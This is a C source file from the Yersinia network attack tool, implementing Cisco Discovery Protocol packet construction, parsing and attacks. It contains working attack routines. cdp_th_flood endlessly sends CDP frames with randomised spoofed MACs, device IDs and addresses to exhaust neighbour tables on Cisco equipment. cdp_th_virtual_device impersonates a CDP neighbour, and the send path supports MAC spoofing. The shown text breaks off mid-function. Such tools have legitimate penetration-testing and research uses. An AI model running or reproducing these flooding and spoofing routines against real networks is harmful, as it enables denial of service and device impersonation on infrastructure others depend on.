/* cdp.c
 * Implementation and attacks for Cisco Discovery Protocol
 *
 * Yersinia
 * By David Barroso <tomac@yersinia.net> and Alfredo Andres <slay@yersinia.net>
 * Copyright 2005, 2006, 2007 Alfredo Andres and David Barroso
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */

#ifndef lint
static const char rcsid[] = 
       "$Id: cdp.c 43 2007-04-27 11:07:17Z slay $";
#endif

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#define _REENTRANT

#include <stdio.h>
#include <errno.h>

#ifdef HAVE_SYS_TYPES_H
#include <sys/types.h>
#endif

#ifdef HAVE_INTTYPES_H
#include <inttypes.h>
#endif

#include <sys/socket.h>       

#ifdef HAVE_NETINET_IN_SYSTM_H
#include <netinet/in_systm.h>
#else
#ifdef HAVE_NETINET_IN_SYSTEM_H
#include <netinet/in_system.h>
#endif
#endif

#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>

#ifdef TIME_WITH_SYS_TIME
#include <sys/time.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#ifdef HAVE_STRING_H
#include <string.h>
#endif

#ifdef HAVE_STRINGS_H
#include <strings.h>
#endif

#ifdef HAVE_BSTRING_H
#include <bstring.h>
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_PTHREAD_H
#include <pthread.h>
#endif

#include <stdarg.h>

#include "cdp.h"

/* Let's wait for libnet to fix the CDP code...
 * meanwhile we'll do it ala Dirty Harry way... 
 */

void
cdp_register(void)
{
   protocol_register(PROTO_CDP, "CDP", "Cisco Discovery Protocol", "cdp",
         sizeof(struct cdp_data), cdp_init_attribs, NULL,
         cdp_get_printable_packet, cdp_get_printable_store,
         cdp_load_values, cdp_attack,
         cdp_update_field, cdp_features,
         cdp_comm_params, SIZE_ARRAY(cdp_comm_params), 
         cdp_params_tlv, SIZE_ARRAY(cdp_params_tlv), cdp_get_extra_field, cdp_init_comms_struct,
         PROTO_VISIBLE, cdp_end);

   protocol_register_tlv(PROTO_CDP, cdp_edit_tlv, cdp_type_desc, cdp_tlv, SIZE_ARRAY(cdp_tlv));
}


/*
 * Inicializa la estructura que se usa para relacionar el tmp_data
 * de cada nodo con los datos que se sacaran por pantalla cuando
 * se accede al demonio de red.
 * Teoricamente como esta funcion solo se llama desde term_add_node()
 * la cual, a su vez, solo es llamada al tener el mutex bloqueado por
 * lo que no veo necesario que sea reentrante. (Fredy). 
 */
int8_t
cdp_init_comms_struct(struct term_node *node)
{
    struct cdp_data *cdp_data;
    void **comm_param;
 
    comm_param = (void *)calloc(1,sizeof(void *)*SIZE_ARRAY(cdp_comm_params));
    
    if (comm_param == NULL)
    {
       thread_error("cdp_init_commands_struct calloc error",errno);
       return -1;
    }

    cdp_data = node->protocol[PROTO_CDP].tmp_data;
    
    node->protocol[PROTO_CDP].commands_param = comm_param;
    
    comm_param[CDP_SMAC] = &cdp_data->mac_source;
    comm_param[CDP_DMAC] = &cdp_data->mac_dest; 
    comm_param[CDP_VER] = &cdp_data->version;
    comm_param[CDP_TTL] = &cdp_data->ttl; 
    comm_param[CDP_CHECKSUM] = &cdp_data->checksum; 

    return 0;
}


int8_t
cdp_send(struct attacks *attacks)
{
    int8_t c;
    int32_t total_length;
    libnet_ptag_t t;
    u_int8_t oui[3], *fixpacket;
    struct cdp_data *cdp_data;
    libnet_t *lhandler;
    u_int16_t checksum;
    dlist_t *p;
    struct interface_data *iface_data;
    struct interface_data *iface_data2;
    
    cdp_data = attacks->data;
    total_length = 0;

    checksum = cdp_chksum((u_int8_t *)cdp_data + 12, 4 + cdp_data->options_len);

    fixpacket = calloc(1, 4 + cdp_data->options_len);
    memcpy((void *)fixpacket, &cdp_data->version, 1);

    memcpy((void *)fixpacket+1, &cdp_data->ttl, 1);

/*    aux_short = htons(cdp_data->checksum);*/
    memcpy((void *)fixpacket+2, &checksum, 2);

    memcpy((void *)fixpacket+4, cdp_data->options, cdp_data->options_len);

    total_length = 4 + cdp_data->options_len;

    for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p)) {
       iface_data = (struct interface_data *) dlist_data(p);
       lhandler = iface_data->libnet_handler;
#ifdef KK
            t = libnet_build_cdp(
                    cdp_data->version,                      /* version */
                    cdp_data->ttl,                          /* time to live */
                    htons(cdp_data->checksum),              /* checksum */
                    0,
                    0,
                    0,
                    (cdp_data->options_len == 0) ? NULL : cdp_data->options,  /* payload */
                    cdp_data->options_len,                  /* payload size */
                    lhandler,                               /* libnet handle */
                    0);                                     /* libnet id */

            if (t == -1) {
                thread_libnet_error("Can't build CDP header",lhandler);
                return -1;
            }
#endif
       oui[0] = 0x00;
       oui[1] = 0x00;
       oui[2] = 0x0C;
       t = libnet_build_802_2snap(
                0xaa,                                   /* SNAP DSAP */
                0xaa,                                   /* SNAP SSAP */
                0x03,                                   /* control */
                oui,                                    /* oui */
                0x2000,                                 /* ARP header follows */
                fixpacket,                              /* payload */
                total_length,                           /* payload size */
                lhandler,                               /* libnet handle */
                0);                                     /* libnet id */

       t = libnet_build_802_3(
                    cdp_data->mac_dest,                 /* ethernet destination */
                    (attacks->mac_spoofing) ? cdp_data->mac_source : iface_data->etheraddr,
                    /* ethernet source */
                    /* LIBNET_CDP_H is 0x08 and the first tuple is included so it's better say 4 (ttl 
                     * + version + checksum) */
                    LIBNET_802_2SNAP_H + total_length, /* frame size */
                    NULL,                               /* payload */
                    0,                                  /* payload size */
                    lhandler,                           /* libnet handle */
                    0);                                 /* libnet id */

       if (t == -1) {
           thread_libnet_error( "Can't build ethernet header", lhandler);
           libnet_clear_packet(lhandler);
           return -1;
       }

       /*
        *  Write it to the wire.
        */
       c = libnet_write(lhandler);

       if (c == -1) {
           thread_libnet_error( "libnet_write error", lhandler);
           libnet_clear_packet(lhandler);
           return -1;
       }

       libnet_clear_packet(lhandler);
       protocols[PROTO_CDP].packets_out++;
       iface_data2 = interfaces_get_struct(iface_data->ifname);
       iface_data2->packets_out[PROTO_CDP]++;
    
    } /* for INTERFACES*/
    
    return 0;
}

void
cdp_th_send_raw(void *arg)
{
    struct attacks *attacks=NULL;
    struct cdp_data *cdp_data;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("cdp_th_send_raw pthread_sigmask()",errno);
       cdp_th_send_raw_exit(attacks);    
    }

    cdp_data = attacks->data;

    cdp_send(attacks);

    cdp_th_send_raw_exit(attacks);
}

	
void
cdp_th_send_raw_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}

void
cdp_th_flood(void *arg)
{
    struct attacks *attacks=NULL;
    struct cdp_data *cdp_data;
    u_int8_t device[8];
    sigset_t mask;
    u_int32_t aux_long, lbl32;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("cdp_th_flood pthread_sigmask()",errno);
       cdp_th_flood_exit(attacks);    
    }

    cdp_data = attacks->data;

    cdp_data->version = CDP_DFL_VERSION;
    parser_vrfy_mac("01:00:0C:CC:CC:CC", cdp_data->mac_dest);

    /* Max TTL */
    cdp_data->ttl = 255;

    aux_long = CDP_CAP_LEVEL3_ROUTING;

    /* Create packet */
    cdp_create_tlv_item(cdp_data, CDP_TYPE_DEVID, "yersinia");
    lbl32 = libnet_get_prand(LIBNET_PRu32);
    cdp_create_tlv_item(cdp_data, CDP_TYPE_ADDRESS, (u_int32_t *)&lbl32);
    cdp_create_tlv_item(cdp_data, CDP_TYPE_PORTID, "Ethernet0");
    cdp_create_tlv_item(cdp_data, CDP_TYPE_CAPABILITY, (u_int8_t *)&aux_long);
    cdp_create_tlv_item(cdp_data, CDP_TYPE_VERSION, VERSION);
    cdp_create_tlv_item(cdp_data, CDP_TYPE_PLATFORM, "yersinia");

    while(!attacks->attack_th.stop)
    {
        /* Change MAC */
        attack_gen_mac(cdp_data->mac_source);

        /* Change DEVICEID */
        parser_get_random_string(device, 8);
        if (cdp_update_tlv_item(cdp_data, CDP_TYPE_DEVID, (void *)device) < 0) {
            write_log(0, "Error in cdp_update_tlv_item\n");
            cdp_th_flood_exit(attacks);
        }

	    /* Change Address */
        lbl32 = libnet_get_prand(LIBNET_PRu32);
        if (cdp_update_tlv_item(cdp_data, CDP_TYPE_ADDRESS, (void *)&lbl32) < 0) {
            write_log(0, "Error in cdp_update_tlv_item\n");
            cdp_th_flood_exit(attacks);
        }

        /* Change CAPABILITIES */
        aux_long = parser_get_random_int(128);
        if (cdp_update_tlv_item(cdp_data, CDP_TYPE_CAPABILITY, (void *)&aux_long) < 0) {
            write_log(0, "Error in cdp_update_tlv_item\n");
            cdp_th_flood_exit(attacks);
        }

        /* Send the packet */
        cdp_send(attacks);
#ifdef NEED_USLEEP
        thread_usleep(100000);
#endif
    }

    cdp_th_flood_exit(attacks);
}


void
cdp_th_flood_exit(struct attacks *attacks)
{
    if (attacks)
        attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}


void
cdp_th_virtual_device(void *arg)
{
    struct attacks *attacks=NULL;
    struct cdp_data *cdp_data;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("cdp_th_virtual_device pthread_sigmask()",errno);
       cdp_th_virtual_device_exit(attacks);    
    }

    cdp_data = attacks->data;

    thread_create(&attacks->helper_th.id, &cdp_send_hellos, attacks);

    while (!attacks->attack_th.stop)
       thread_usleep(200000);

    cdp_th_virtual_device_exit(attacks);
}


void
cdp_th_virtual_device_exit(struct attacks *attacks)
{
    if (attacks)
        attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}


void
cdp_send_hellos(void *arg)
{
    u_int32_t ret;
    u_int16_t secs;
    struct timeval hello;
    struct attacks *attacks;
    struct cdp_data *cdp_data;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->helper_th.finished);

    pthread_detach(pthread_self());

    hello.tv_sec  = 0;
    hello.tv_usec = 0;

    cdp_data = attacks->data;

    secs = 0;
    
write_log(0,"\n cdp_helper: %d started...\n",(int)pthread_self());
    cdp_send(attacks);
        
    while(!attacks->helper_th.stop)
    {
        if ( (ret=select( 0, NULL, NULL, NULL, &hello ) ) == -1 ) {
            thread_error("Error in select", errno);
            break;
        }

        if ( !ret )  /* Timeout... */
        {
            /* Default hello time is ttl / 3, min 5 secs */
            
            if (secs == ((cdp_data->ttl / 3) > 5 ? (cdp_data->ttl / 3) : 5)) /* Send CDP hello...*/
            {
               cdp_send(attacks);
               secs=0;
            }
            else
               secs++;
        }
        hello.tv_sec  = 1;
        hello.tv_usec = 0;
    } 

write_log(0," cdp_helper: %d finished...\n",(int)pthread_self());
    
    pthread_mutex_unlock(&attacks->helper_th.finished);
    
    pthread_exit(NULL);
}


int8_t
cdp_create_tlv_item(struct cdp_data *cdp_data, u_int16_t type, void *value)
{
    u_int16_t aux_short;
    u_int32_t aux_long;
    u_int8_t len;

    switch(type) {
        case CDP_TYPE_DEVID:
        case CDP_TYPE_PORTID:
        case CDP_TYPE_VERSION:
        case CDP_TYPE_PLATFORM:
            len = strlen(value) + 4;
            if (cdp_data->options_len + len < MAX_TLV*MAX_VALUE_LENGTH) {
                /* Type */
                aux_short = htons(type);
                memcpy((void *)(cdp_data->options + cdp_data->options_len), (void *)&aux_short, 2);
                /* Length */
                aux_short = htons(len);
                memcpy((void *)(cdp_data->options + cdp_data->options_len + 2), (void *)&aux_short, 2);
                /* Value */
                memcpy((void *)(cdp_data->options + cdp_data->options_len + 4), (void *)value, len - 4);
                cdp_data->options_len += len;
            } 
            else
                return -1;
        break;
        case CDP_TYPE_ADDRESS:
            len = 13 + 4;
            if (cdp_data->options_len + len < MAX_TLV*MAX_VALUE_LENGTH) {
                /* Type */
                aux_short = htons(type);
                memcpy((void *)cdp_data->options + cdp_data->options_len, &aux_short, 2);
                /* Length */
                aux_short = htons(len);
                memcpy((void *)cdp_data->options + cdp_data->options_len + 2, &aux_short, 2);
                /* Value */
                /* Number of IP */
                aux_long = htonl(0x00000001);
                memcpy((void *)cdp_data->options + cdp_data->options_len + 4, &aux_long, 4);
                /* Type */
                memcpy((void *)cdp_data->options + cdp_data->options_len + 8, "\x01", 1); /* NLPID */
                /* Length */
                memcpy((void *)cdp_data->options + cdp_data->options_len + 9, "\x01", 1);
                /* Protocol */
                memcpy((void *)cdp_data->options + cdp_data->options_len + 10, "\xcc", 1); /* IP */
                /* Length */
                aux_short = htons(0x0004);
                memcpy((void *)cdp_data->options + cdp_data->options_len + 11, &aux_short, 2);
                /* IP */
/*                aux_long = ntohl(addr.s_addr);*/
                memcpy((void *)cdp_data->options + cdp_data->options_len + 13, (void *)value, 4);

                cdp_data->options_len += len;
            }
            else
                return -1;
        break;
        case CDP_TYPE_CAPABILITY:
            len = 4 + 4;
            if (cdp_data->options_len + len < MAX_TLV*MAX_VALUE_LENGTH) {
                /* Type */
                aux_short = htons(type);
                memcpy((void *)cdp_data->options + cdp_data->options_len, &aux_short, 2);
                /* Length */
                aux_short = htons(len);
                memcpy((void *)cdp_data->options + cdp_data->options_len + 2, &aux_short, 2);
                /* Value */
                aux_long = htonl((*(u_int32_t *)value));
                memcpy((void *)cdp_data->options + cdp_data->options_len + 4, &aux_long, 4);

                cdp_data->options_len += len;
            }
            else
                return -1;
        break;
        default:
            len = strlen(value) + 4;
            if (cdp_data->options_len + len < MAX_TLV*MAX_VALUE_LENGTH) {
                /* Type */
                aux_short = htons(type);
                memcpy((void *)(cdp_data->options + cdp_data->options_len), (void *)&aux_short, 2);
                /* Length */
                aux_short = htons(len);
                memcpy((void *)(cdp_data->options + cdp_data->options_len + 2), (void *)&aux_short, 2);
                /* Value */
                memcpy((void *)(cdp_data->options + cdp_data->options_len + 4), (void *)value, len - 4);
                cdp_data->options_len += len;
            } 
            else
                return -1;
        break;
    }

    return 0;
}


int8_t
cdp_update_tlv_item(struct cdp_data *cdp_data, u_int16_t type, char *value)
{
    u_int8_t i, value_len, j;
    u_int16_t len, aux_short, offset;
    u_int32_t aux_long;
    int8_t gap;

    i = 0;
    offset = 0;

    /* Find the TLV */
    while ((i < MAX_TLV) && (offset < cdp_data->options_len)) {
        if (ntohs((*(u_int16_t *)(cdp_data->options + offset + 2))) > cdp_data->options_len) {
            return -1; /* Oversized packet */
	}
        len = ntohs((*(u_int16_t *)(cdp_data->options + offset + 2)));
        if (ntohs((*(u_int16_t *)(cdp_data->options + offset))) == type) { /* found */

            switch(type) {
                case CDP_TYPE_DEVID:
                case CDP_TYPE_PORTID:
                case CDP_TYPE_VERSION:
                case CDP_TYPE_PLATFORM:
                    value_len = strlen(value);
                    if ((cdp_data->options_len + value_len - (len - 4)) > (MAX_TLV * MAX_VALUE_LENGTH)) {
                        write_log(0, "Trying to create oversized options\n");
                        return -1;
                    }

                    gap = value_len - (len - 4);
                    if (gap > 0) { /* Shift right */
                        for (j = cdp_data->options_len - 1; j >= offset + len; j--) 
                            cdp_data->options[j+gap] = cdp_data->options[j];
                    } else if (gap < 0) { /* Shift left */
                        for (j = offset + len; j < cdp_data->options_len; j++) 
                            cdp_data->options[j+gap] = cdp_data->options[j];
                    }

		    /* Compute real size */
		    if (gap != 0) {
		        aux_short = htons(len + gap);
		        memcpy((void *)(cdp_data->options+offset+2), &aux_short, 2);
                        cdp_data->options_len += gap;
	            }
                    memcpy((void *)(cdp_data->options+offset+4), value, value_len);
		    return 0;
                break;
                case CDP_TYPE_CAPABILITY:
                    aux_long = htonl((*(u_int32_t *)value));
                    memcpy((void *)(cdp_data->options+offset+4), &aux_long, 4);
                    return 0;
                break;
                case CDP_TYPE_ADDRESS:
                memcpy((void *)cdp_data->options + offset + 13, (void *)value, 4);
                return 0;
                break;
            }
        }
        i++;
        offset += len;
    }

    return 0;
}

int8_t
cdp_edit_tlv(struct term_node *node, u_int8_t action, u_int8_t pointer, u_int16_t type, u_int8_t *value)
{
    u_int8_t i;
    u_int16_t len, offset;
    u_int16_t aux_short;
    u_int32_t aux_long;
	struct cdp_data *cdp_data;

    i = 0;
    offset = 0;
    cdp_data = (struct cdp_data *) node->protocol[PROTO_CDP].tmp_data;

	switch(action) {
		case TLV_DELETE:
			/* Find the TLV */
			while ((i < MAX_TLV) && (offset < cdp_data->options_len)) {
				if (ntohs((*(u_int16_t *)(cdp_data->options + offset + 2))) > cdp_data->options_len) {
					return -1; /* Oversized packet */
			    }

			    len = ntohs((*(u_int16_t *)(cdp_data->options + offset + 2)));
				if (i == pointer) {
					cdp_data->options_len -= len;
					memcpy((void *)(cdp_data->options + offset), (void *)(cdp_data->options + offset + len),
							cdp_data->options_len - offset);

					/* Space left in options should be zero */
					memset((void *)(cdp_data->options + cdp_data->options_len), 0, MAX_TLV*MAX_VALUE_LENGTH - cdp_data->options_len);
					return 0;
				}

				i++;
				offset += len;
			}
		break;
		case TLV_ADD:
			switch(type) {
				case CDP_TYPE_DEVID:
				case CDP_TYPE_PORTID:
				case CDP_TYPE_VERSION:
				case CDP_TYPE_PLATFORM:
					len = strlen((char *)value) + 4;
					if (cdp_data->options_len + len < MAX_TLV*MAX_VALUE_LENGTH) {
						/* Type */
						aux_short = htons(type);
						memcpy((void *)(cdp_data->options + cdp_data->options_len), (void *)&aux_short, 2);
						/* Length */
						aux_short = htons(len);
						memcpy((void *)(cdp_data->options + cdp_data->options_len + 2), (void *)&aux_short, 2);
						/* Value */
						memcpy((void *)(cdp_data->options + cdp_data->options_len + 4), (void *)value, len - 4);
						cdp_data->options_len += len;
					} 
					else
						return -1;
				break;
				case CDP_TYPE_ADDRESS:
					len = 13 + 4;
					if (cdp_data->options_len + len < MAX_TLV*MAX_VALUE_LENGTH) {
						/* Type */
						aux_short = htons(type);
						memcpy((void *)cdp_data->options + cdp_data->options_len, &aux_short, 2);
						/* Length */
						aux_short = htons(len);
						memcpy((void *)cdp_data->options + cdp_data->options_len + 2, &aux_short, 2);
						/* Value */
						/* Number of IP */
						aux_long = htonl(0x00000001);
						memcpy((void *)cdp_data->options + cdp_data->options_len + 4, &aux_long, 4);
						/* Type */
						memcpy((void *)cdp_data->options + cdp_data->options_len + 8, "\x01", 1); /* NLPID */
						/* Length */
						memcpy((void *)cdp_data->options + cdp_data->options_len + 9, "\x01", 1);
						/* Protocol */
						memcpy((void *)cdp_data->options + cdp_data->options_len + 10, "\xcc", 1); /* IP */
						/* Length */
						aux_short = htons(0x0004);
						memcpy((void *)cdp_data->options + cdp_data->options_len + 11, &aux_short, 2);
						/* IP */
		/*                aux_long = ntohl(addr.s_addr);*/
						memcpy((void *)cdp_data->options + cdp_data->options_len + 13, (void *)value, 4);

						cdp_data->options_len += len;
					}
					else
						return -1;
				break;
				case CDP_TYPE_CAPABILITY:
					len = 4 + 4;
					if (cdp_data->options_len + len < MAX_TLV*MAX_VALUE_LENGTH) {
						/* Type */
						aux_short = htons(type);
						memcpy((void *)cdp_data->options + cdp_data->options_len, &aux_short, 2);
						/* Length */
						aux_short = htons(len);
						memcpy((void *)cdp_data->options + cdp_data->options_len + 2, &aux_short, 2);
						/* Value */
						aux_long = htonl((*(u_int32_t *)value));
						memcpy((void *)cdp_data->options + cdp_data->options_len + 4, &aux_long, 4);

						cdp_data->options_len += len;
					}
					else
						return -1;

				break;
			}
		break;
	}

    return -1;
}


/* 
 * Return formated strings of each CDP field
 */
char **
cdp_get_printable_packet(struct pcap_data *data)
{
   struct libnet_802_3_hdr *ether;
   u_char *cdp_data, *ptr;
   char *buf_ptr, *buf_ptr_orig;
   u_int8_t i, k;
#ifdef LBL_ALIGN
   u_int16_t aux_short;
#endif
   char **field_values;
   char buffer[4096];
   u_int16_t type, len;
   u_int32_t total_len;

   if ((field_values = (char **) protocol_create_printable(protocols[PROTO_CDP].nparams, protocols[PROTO_CDP].parameters)) == NULL) {
      write_log(0, "Error in calloc\n");
      return NULL;
   }

   ether = (struct libnet_802_3_hdr *) data->packet;
   cdp_data = (u_char *) (data->packet + LIBNET_802_3_H + LIBNET_802_2SNAP_H);

   /* Source MAC */
   snprintf(field_values[CDP_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
         ether->_802_3_shost[0], ether->_802_3_shost[1], ether->_802_3_shost[2],
         ether->_802_3_shost[3], ether->_802_3_shost[4], ether->_802_3_shost[5]);
   /* Destination MAC */
   snprintf(field_values[CDP_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
         ether->_802_3_dhost[0], ether->_802_3_dhost[1], ether->_802_3_dhost[2],
         ether->_802_3_dhost[3], ether->_802_3_dhost[4], ether->_802_3_dhost[5]);
   /* Version */
   snprintf(field_values[CDP_VER], 3, "%02X", *((u_char *)cdp_data));
   /* TTL */
   snprintf(field_values[CDP_TTL], 3, "%02X", *((u_char *)cdp_data+1));
   /* Checksum */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_short,cdp_data+2,2);
   snprintf(field_values[CDP_CHECKSUM], 5, "%04X", ntohs(aux_short));
#else
   snprintf(field_values[CDP_CHECKSUM], 5, "%04X", ntohs(*(u_int16_t *)(cdp_data+2)));
#endif

   ptr = cdp_data + 4;
   buf_ptr_orig = buf_ptr = buffer;
   i = 0;
   memset((void *)buffer, 0, 4096);
   total_len = 0;

   /* now the tlv section starts */
   while((ptr < data->packet + data->header->caplen) && (i < MAX_TLV)) {
      if ((ptr+4) > ( data->packet + data->header->caplen)) /* Undersized packet !! */
         /*            return NULL;*/
         break;

#ifdef LBL_ALIGN
      memcpy((void *)&aux_short,ptr,2);
      type = ntohs(aux_short);
      memcpy((void*)&aux_short,(ptr+2),2);
      len = ntohs(aux_short);
#else
      type = ntohs(*(u_int16_t *)ptr);
      len = ntohs(*(u_int16_t *)(ptr + 2));
#endif

      if ((ptr + len) > data->packet + data->header->caplen)
         return NULL; /* Oversized packet!! */

      if (!len)
         break;

      /*
       * TLV len must be at least 5 bytes (header + data).  
       * Anyway i think we can give a chance to the rest
       * of TLVs... ;)
       */
      if (len >= 4) 
      {   
         /* First we get the type */
         k = 0;
         while(cdp_type_desc[k].desc) {
            if (cdp_type_desc[k].type == type) {
               strncpy(buf_ptr, cdp_type_desc[k].desc, strlen((char *)cdp_type_desc[k].desc));
               buf_ptr += strlen((char *)cdp_type_desc[k].desc) + 1;
               total_len += strlen((char *)cdp_type_desc[k].desc) + 1;
               /* Now copy the value */
               switch(type) {
                  case CDP_TYPE_DEVID:
                  case CDP_TYPE_PORTID:
                  case CDP_TYPE_VERSION:
                  case CDP_TYPE_PLATFORM:
                  case CDP_TYPE_VTP_MGMT_DOMAIN:
                  case CDP_TYPE_SYSTEM_NAME:
                  case CDP_TYPE_LOCATION:
                     if ((len-4) < MAX_VALUE_LENGTH) {
                        memcpy(buf_ptr, ptr+4, len-4);
                        buf_ptr += len - 4 + 1;
                        total_len += len - 4 + 1;
                     } else {
                        memcpy(buf_ptr, ptr+4, MAX_VALUE_LENGTH);
                        buf_ptr += MAX_VALUE_LENGTH + 1;
                        total_len += MAX_VALUE_LENGTH + 1;
                        /*				tlv[i][MAX_VALUE_LENGTH-2] = '|';
                                    tlv[i].value[MAX_VALUE_LENGTH-1] = '\0';*/
                     }
                     break;
                  case CDP_TYPE_ADDRESS:
                  case CDP_TYPE_MANAGEMENT_ADDR:
                     /* Only get the 1st IP address */
                     if ((*(ptr+8) == 0x01) && (*(ptr+9) == 0x01) && (*(ptr+10) == 0xcc)) {
                        parser_get_formated_inet_address(ntohl((*(u_int32_t *)(ptr + 13))), buf_ptr, 16);
                        buf_ptr += 16;
                        total_len += 16;
                     } else {
                        *buf_ptr = '\0';
                        buf_ptr++;
                        total_len++;
                     }
                     break;
                  case CDP_TYPE_CAPABILITY: /* 4 byte field */
                     if (len == 8) {
                        snprintf(buf_ptr, 9, "%02X%02X%02X%02X",
                              *(ptr+4), *(ptr+5), *(ptr+6), *(ptr+7));
                        /*				cdp->tlv[i].value[8] = '\0';*/
                        buf_ptr += 9;
                        total_len += 9;
                     }
                     break;
                     /*      case CDP_TYPE_IPPREFIX:
                             case CDP_TYPE_PROTOCOL_HELLO:*/
                  case CDP_TYPE_NATIVE_VLAN:
                     snprintf(buf_ptr, 5, "%04X", ntohs(*((u_int16_t *)(ptr+4))));
                     buf_ptr += 5;
                     total_len += 5;
                     break;
                  case CDP_TYPE_DUPLEX:
                  case CDP_TYPE_TRUST_BITMAP:
                  case CDP_TYPE_UNTRUSTED_COS:
                     snprintf(buf_ptr, 3, "%02X", *((u_int8_t *)(ptr+4)));
                     buf_ptr += 3;
                     total_len += 3;
                     break;
                     /*            case CDP_TYPE_VOIP_VLAN_REPLY:
                                   case CDP_TYPE_VOIP_VLAN_QUERY:
                                   case CDP_TYPE_MTU:
                                   case CDP_TYPE_SYSTEM_OID:*/
                  default:
                     *buf_ptr = '\0';
                     buf_ptr++;
                     total_len++;
                     break;
               }
            }
            k++;
         }
      }
      i++;
      ptr += len;
   }

   if (total_len > 0)
   {
      if ((field_values[CDP_TLV] = (char *) calloc(1, total_len)) == NULL)
         write_log(0, "error in calloc\n");
      
      memcpy((void *)field_values[CDP_TLV], (void *)buffer, total_len);
   }

   return (char **)field_values;
}


char **
cdp_get_printable_store(struct term_node *node)
{
    struct cdp_data *cdp;
    struct commands_param_extra_item *item;
    dlist_t *p;
#ifdef LBL_ALIGN
    u_int16_t aux_short;
#endif
    u_int8_t *ptr, i, k, j;
    char **field_values;
    char buffer[4096], *buf_ptr;
    u_int16_t type, len, total;

    /* smac + dmac + version + ttl + checksum + tlv + null = 7 */
   if ((field_values = (char **) protocol_create_printable(protocols[PROTO_CDP].nparams, protocols[PROTO_CDP].parameters)) == NULL) {
	    write_log(0, "Error in calloc\n");
	    return NULL;
    }

    if (node == NULL)
       cdp = protocols[PROTO_CDP].default_values;
    else
       cdp = (struct cdp_data *) node->protocol[PROTO_CDP].tmp_data;

    /* Source MAC */
    snprintf(field_values[CDP_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
            cdp->mac_source[0], cdp->mac_source[1],
            cdp->mac_source[2], cdp->mac_source[3],
            cdp->mac_source[4], cdp->mac_source[5]);
    /* Destination MAC */
    snprintf(field_values[CDP_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
            cdp->mac_dest[0], cdp->mac_dest[1],
            cdp->mac_dest[2], cdp->mac_dest[3],
            cdp->mac_dest[4], cdp->mac_dest[5]);

    /* Version */
    snprintf(field_values[CDP_VER], 3, "%02X", cdp->version);

    /* TTL */
    snprintf(field_values[CDP_TTL], 3, "%02X", cdp->ttl);

    /* Checksum */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short, (void *)&cdp->checksum, 2);
    snprintf(field_values[CDP_CHECKSUM], 5, "%04X", aux_short);
#else
    snprintf(field_values[CDP_CHECKSUM], 5, "%04X", cdp->checksum);
#endif

    memset((void *)buffer, 0, 4096);
    buf_ptr = buffer;
    total = 0;
    /* TLV */
    /* Take care: options in the store are stored in network byte order */
    for (p=cdp->extra;p;p=dlist_next(cdp->extra, p))
    {
       item = (struct commands_param_extra_item *) dlist_data(p);
       ptr = item->value;

       i = 0;
       while(i < protocols[PROTO_CDP].extra_nparams)
       {
          if (protocols[PROTO_CDP].extra_parameters[i].id == item->id)
          {
             strncpy(buf_ptr, protocols[PROTO_CDP].extra_parameters[i].ldesc, strlen((char *)protocols[PROTO_CDP].extra_parameters[i].ldesc));
             buf_ptr += strlen(protocols[PROTO_CDP].extra_parameters[i].ldesc) + 1;
             total += strlen(protocols[PROTO_CDP].extra_parameters[i].ldesc) + 1;

             /* Now copy the value */
             strncpy(buf_ptr, (char *)ptr, protocols[PROTO_CDP].extra_parameters[i].size_print);
             total += strlen(buf_ptr) + 1;
             buf_ptr += strlen(buf_ptr) + 1;

#ifdef KK
             switch(protocols[PROTO_CDP].extra_parameters[i].type) 
             {
                case FIELD_HEX:
                case FIELD_STR:
                   strncpy(buf_ptr, (char *)ptr, protocols[PROTO_CDP].extra_parameters[i].size_print);
                   total += strlen(buf_ptr) + 1;
                   buf_ptr += strlen(buf_ptr) + 1;
                   break;

                case FIELD_HEX:
                   for (j = 0; j < protocols[PROTO_CDP].extra_parameters[i].size_print;j++)
                   {
                      snprintf(buf_ptr, 3, "%02X", *(ptr));
                      ptr++;
                      buf_ptr++;
                      total++;
                   }
                   break;
                            
                        case CDP_TYPE_ADDRESS:
                        case CDP_TYPE_MANAGEMENT_ADDR:
                        /* Only get the 1st IP address */
                            if ((*(ptr+8) == 0x01) && (*(ptr+9) == 0x01) && (*(ptr+10) == 0xcc)) {
                                parser_get_formated_inet_address(ntohl((*(u_int32_t *)(ptr + 13))), tlv, 16);
                                tlv += 16;
                                total += 16;
                            } else {
								*tlv = '\0';
							    tlv++;
							}
                        break;
